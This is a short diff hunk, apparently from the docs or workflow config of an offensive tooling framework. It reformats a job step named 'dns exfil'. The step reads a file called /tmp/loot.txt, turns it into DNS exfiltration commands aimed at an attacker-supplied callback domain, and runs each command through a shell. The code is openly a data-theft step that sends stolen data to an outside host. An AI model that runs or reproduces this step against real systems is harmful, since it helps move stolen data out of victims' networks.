@@ -96,13 +96,15 @@ jobs:
   exfil:
     steps:
       - name: dns exfil
-        script: |
-          from ofx.api.exfil import dns_exfil_commands
-          import subprocess
+        module: python
+        with:
+          script: |
+            from ofx.api.exfil import dns_exfil_commands
+            import subprocess
 
-          data = open("/tmp/loot.txt", "rb").read()
-          for cmd in dns_exfil_commands(data, "{{ inputs.callback_domain }}"):
-              subprocess.run(cmd, shell=True)
+            data = open("/tmp/loot.txt", "rb").read()
+            for cmd in dns_exfil_commands(data, "{{ inputs.callback_domain }}"):
+                subprocess.run(cmd, shell=True)
 ```
 
 ---
